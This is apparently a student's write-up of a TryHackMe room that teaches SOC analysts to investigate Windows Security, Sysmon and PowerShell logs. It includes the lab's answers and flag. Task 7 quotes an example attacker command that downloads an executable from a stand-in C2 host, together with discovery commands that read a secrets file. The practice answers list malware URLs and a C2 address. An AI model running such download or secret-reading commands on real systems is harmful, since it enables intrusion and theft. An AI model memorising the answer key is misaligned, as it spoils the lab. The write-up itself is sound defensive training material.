# TryHackMe - Windows Logging for SOC

**Date:** 2026-09-06\
**Room:** Windows Logging for SOC\
**Platform:** TryHackMe

------------------------------------------------------------------------

## What this room was about

In this room, I learned how Windows logs can be used by a SOC analyst to
investigate suspicious activity.

The main areas I covered were:

-   Windows Event Viewer
-   Security logs
-   Successful and failed logons
-   User management events
-   Sysmon process monitoring
-   Sysmon file and network events
-   PowerShell logging and history

The main thing I understood is that different Windows logs give
different parts of an attack. By correlating them together, I can build
a better picture of what happened on a system.

------------------------------------------------------------------------

# Task 1 - Introduction

Windows logging is very important for SOC analysts because most activity
on a Windows machine generates events.

Examples include:

-   Starting a program
-   Creating a file
-   Logging into the system
-   Changing a user account
-   Making a network connection
-   Running PowerShell commands

SOC analysts use these logs to:

-   Investigate incidents
-   Hunt for threats
-   Create detections
-   Triage alerts
-   Reconstruct attack activity

------------------------------------------------------------------------

# Task 2 - What Is Logged

Whenever an action happens on Windows, the operating system can record
it as an event.

A log normally contains information such as:

-   When the event happened
-   What action occurred
-   Which user was involved
-   What process was involved
-   Source information such as an IP address

Windows event logs are stored as **EVTX** files.

Default location:

``` text
C:\Windows\System32\winevt\Logs
```

I used **Event Viewer** to read these logs because EVTX files are stored
in a binary format.

## Opening Event Viewer

I can open Event Viewer by searching for **Event Viewer** in Windows
Search, or by pressing `Win + R` and entering:

``` text
eventvwr
```

## Important parts of Event Viewer

1.  **Log Sources** - Application, Security, Setup, System, etc.
2.  **Log List** - individual events with fields such as time, source
    and Event ID.
3.  **Log Details** - the actual information contained in the selected
    event.
4.  **Filters** - useful for filtering large logs and finding specific
    events.

## Question

**Which event ID describes a successful login?**

**Answer:** `Security / 4624`

------------------------------------------------------------------------

# Task 3 - Security Log: Authentication

Two of the most important Windows Security events for authentication
are:

  -----------------------------------------------------------------------
  Event ID                Meaning                 Useful for
  ----------------------- ----------------------- -----------------------
  **4624**                Successful Logon        Detecting suspicious
                                                  logins and finding
                                                  attack starting points

  **4625**                Failed Logon            Detecting brute force
                                                  and password spraying
  -----------------------------------------------------------------------

## Event ID 4624 - Successful Logon

Important fields include:

-   Username
-   Logon ID
-   Logon Type
-   Source IP
-   Workstation Name

The **Logon ID** is especially useful because it can be used to
correlate this login with later events from the same session.

## Event ID 4625 - Failed Logon

A large number of failed logons can indicate:

-   Brute force
-   Password spraying
-   Vulnerability scanning

## Important Logon Types

  Logon Type   Meaning
  ------------ --------------------------------
  **3**        Network logon
  **10**       Remote Interactive / RDP logon

## Detecting RDP Brute Force

1.  Open Security logs.
2.  Filter for Event ID `4625`.
3.  Look for Logon Type `3` and `10`.
4.  Check for many different usernames being attempted.
5.  Check for many failures against one account such as `Administrator`.
6.  Check the source IP and workstation name.

## Analysing Successful RDP Logons

1.  Filter for Event ID `4624`.
2.  Look for Logon Type `10`.
3.  Check the source information.
4.  Look for a preceding brute-force attack.
5.  Save the **Logon ID**.
6.  Use the Logon ID to correlate later activity.

## Practice - Authentication

I opened `Practice-Security.evtx` from the VM Desktop.

### Which IP performed a brute force of the THM-PC?

``` text
10.10.53.248
```

### Which user was breached as a result of the attack?

``` text
Administrator
```

### What was the Logon ID of the malicious RDP login?

The login had Logon Type `10`.

``` text
0x183c36d
```

------------------------------------------------------------------------

# Task 4 - Security Log: User Management

User management events are useful because attackers may create accounts,
change passwords or add accounts to privileged groups for persistence
and privilege escalation.

  Event ID   Description                        Possible malicious use
  ---------- ---------------------------------- ----------------------------------
  **4720**   User account created               Creating a backdoor account
  **4722**   User account enabled               Enabling an old/backdoor account
  **4738**   User account changed               Modifying account settings
  **4725**   User account disabled              Disabling accounts
  **4726**   User account deleted               Removing accounts
  **4723**   User changed password              Password manipulation
  **4724**   User password reset                Taking control of an account
  **4732**   User added to security group       Privilege escalation
  **4733**   User removed from security group   Removing access

## Structure of User Management Events

I learned to look at three main parts:

### Subject

The account that performed the action. The **Logon ID** can be
correlated with the preceding `4624` login.

### Object

The account or group that was targeted. Depending on the event, this can
appear as a New Account, Member or Target Account.

### Details

The actual changes made, such as the target group or new account
attributes.

## Hunting for Backdoored Users

1.  Filter for Event ID `4720` and `4732`.
2.  Review the events.
3.  Look for unexpected account creation.
4.  Check the time and account naming pattern.
5.  Identify the account that performed the action.
6.  Copy its Logon ID.
7.  Find the corresponding `4624` event.
8.  Continue investigating the source and activity.

## Practice - User Management

I continued using `Practice-Security.evtx`.

### Which user was created by the attacker soon after the RDP login?

``` text
svc_sysrestore
```

### Which two privileged groups was the backdoor user added to?

``` text
Backup Operators, Remote Desktop Users
```

## Attack correlation

``` text
4624 - Successful RDP Login
        ↓
4720 - New User Created
        ↓
4732 - User Added to Privileged Group
```

This showed me why correlating events is more useful than looking at one
event alone.

------------------------------------------------------------------------

# Task 5 - Sysmon: Process Monitoring

Windows Security Event ID `4688` can log process creation, but Sysmon
Event ID `1` provides more detailed information.

  Event ID   Source             Purpose
  ---------- ------------------ ---------------------------
  **4688**   Windows Security   Process Creation
  **1**      Sysmon             Detailed Process Creation

## Sysmon Event ID 1

Important information includes:

### Process Info

-   Process ID
-   Image/path
-   Command line

### Parent Info

-   Parent Process ID
-   Parent Image
-   Parent Command Line

This helps build a process tree.

### Binary Info

-   MD5
-   SHA256
-   File information
-   Company
-   Original filename

### User Context

-   User
-   Logon ID

## Process Red Flags

I should investigate processes that:

-   Run from unusual directories such as `C:\Temp` or `C:\Users\Public`
-   Have suspicious names
-   Have hashes matching known malware
-   Have an unexpected parent process

## Following a Process Tree

1.  Take the `ProcessId` from Event ID `1`.
2.  Find the event where it was created.
3.  Compare it with the `ParentProcessId`.
4.  Move backwards through the process tree.
5.  Correlate the activity using the Logon ID.

## Practice - Sysmon Process Creation

I opened `Practice-Sysmon.evtx` from the VM Desktop.

### Which web browser does Sarah use to browse the web?

``` text
Google Chrome
```

### Which file did Sarah download from the browser?

``` text
C:\Users\sarah.miller\Downloads\ckjg.exe
```

### Which URL was the file downloaded from?

``` text
http://gettsveriff.com/bgj3/ckjg.exe
```

------------------------------------------------------------------------

# Task 6 - Sysmon: Files and Network

Sysmon can monitor more than process creation. Important events covered
here were:

  Event ID   Purpose
  ---------- --------------------
  **11**     File Create
  **13**     Registry Value Set
  **3**      Network Connection
  **22**     DNS Query

## Why correlate Sysmon events?

A process creation event may tell me that a suspicious executable
started. Other events can show what happened afterwards.

``` text
Process Creation
       ↓
File Creation
       ↓
Network Connection
       ↓
DNS Query
```

## Network Red Flags

I should investigate:

-   External IP connections
-   Port `80`
-   Unusual ports such as `4444`
-   Known malicious IP addresses
-   Suspicious domains

## File and Registry Red Flags

I should look for:

-   Executables in `C:\Temp`
-   Files in `C:\Users\Public`
-   `.bat` or `.ps1` scripts
-   `.exe` or `.com` files
-   Registry changes that may provide persistence

## Practice - Files and Network

I continued with `Practice-Sysmon.evtx`.

### Which file was created by the downloaded malware to persist on the host?

``` text
C:\Users\sarah.miller\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\DeleteApp.url
```

The **Startup** folder is important because files placed there can be
executed when the user logs in.

### What is the Command & Control server the malware connected to?

``` text
193.46.217.4:7777
```

### Which domain does the malicious IP correspond to?

``` text
hkfasfsafg.click
```

## Attack chain

``` text
Google Chrome
      ↓
Downloaded ckjg.exe
      ↓
Malware executed
      ↓
DeleteApp.url created in Startup folder
      ↓
Persistence established
      ↓
Connection to 193.46.217.4:7777
      ↓
hkfasfsafg.click
```

------------------------------------------------------------------------

# Task 7 - PowerShell: Logging Commands

PowerShell is frequently abused by attackers because it is already
available on Windows and can perform many actions from one terminal
session.

Example commands from the room:

``` powershell
Get-ChildItem
Get-Content secrets.txt
Get-LocalUser
Get-LocalGroup
Invoke-WebRequest http://c2server.thm/a.exe -OutPath C:\Temp\a.exe
```

These commands could be used for system discovery, reading files and
downloading malware.

## Why Sysmon Event ID 1 is not enough

If an attacker launches `powershell.exe`, Sysmon can show that
PowerShell started. However, many commands can be executed inside the
same PowerShell process without creating a new process for each command.

Because of this, Event ID `1` alone may not show exactly what commands
were executed.

------------------------------------------------------------------------

## PowerShell History

One simple way to investigate PowerShell commands is the PowerShell
history file:

``` text
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

For the Administrator account:

``` text
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The history file records commands entered into PowerShell.

### Important limitations

-   It records commands typed into PowerShell.
-   It does not record command output.
-   It does not show the contents of scripts that were executed.
-   It can be deleted by an attacker.
-   Each user has their own history file.

## Practice - PowerShell History

I reviewed the Administrator's PowerShell history on the VM.

### Which PowerShell command was executed first?

``` powershell
Get-ComputerInfo
```

### When did the Administrator run the first PowerShell command?

``` text
May 18, 2025
```

### Finding the flag

The hint suggested checking the PowerShell history of other local users,
so I checked their history files as well.

I found the following command:

``` powershell
echo "THM{it_was_me!}" > flag.txt
```

### Flag

``` text
THM{it_was_me!}
```

------------------------------------------------------------------------

# Important Event IDs From This Room

  Event ID   Log Source   Meaning
  ---------- ------------ ----------------------------------
  **4624**   Security     Successful Logon
  **4625**   Security     Failed Logon
  **4720**   Security     User Account Created
  **4722**   Security     User Account Enabled
  **4738**   Security     User Account Changed
  **4725**   Security     User Account Disabled
  **4726**   Security     User Account Deleted
  **4723**   Security     User Changed Password
  **4724**   Security     Password Reset
  **4732**   Security     User Added to Security Group
  **4733**   Security     User Removed from Security Group
  **4688**   Security     Process Creation
  **1**      Sysmon       Process Creation
  **11**     Sysmon       File Create
  **13**     Sysmon       Registry Value Set
  **3**      Sysmon       Network Connection
  **22**     Sysmon       DNS Query

------------------------------------------------------------------------

# What I learned

The biggest thing I learned from this room is that Windows logging is
not just about memorising Event IDs. The important skill is **connecting
events together**.

For example:

``` text
4624 - Successful Login
      ↓
4720 - Account Created
      ↓
4732 - Added to Privileged Group
      ↓
4688 / Sysmon 1 - Process Created
      ↓
Sysmon 11 - File Created
      ↓
Sysmon 3 - Network Connection
      ↓
PowerShell History - Commands Executed
```

Each log gives a different piece of information. By correlating them, I
can build an attack timeline and understand what happened on the
endpoint.

